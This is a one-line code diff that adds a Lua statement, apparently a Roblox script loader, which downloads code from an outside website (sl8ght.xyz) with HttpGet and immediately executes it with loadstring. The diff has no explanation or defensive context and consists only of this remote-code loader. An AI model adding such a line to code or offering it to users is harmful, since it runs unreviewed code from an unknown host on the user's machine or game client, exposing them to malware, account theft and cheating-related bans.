@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sl8ght.xyz/"))()
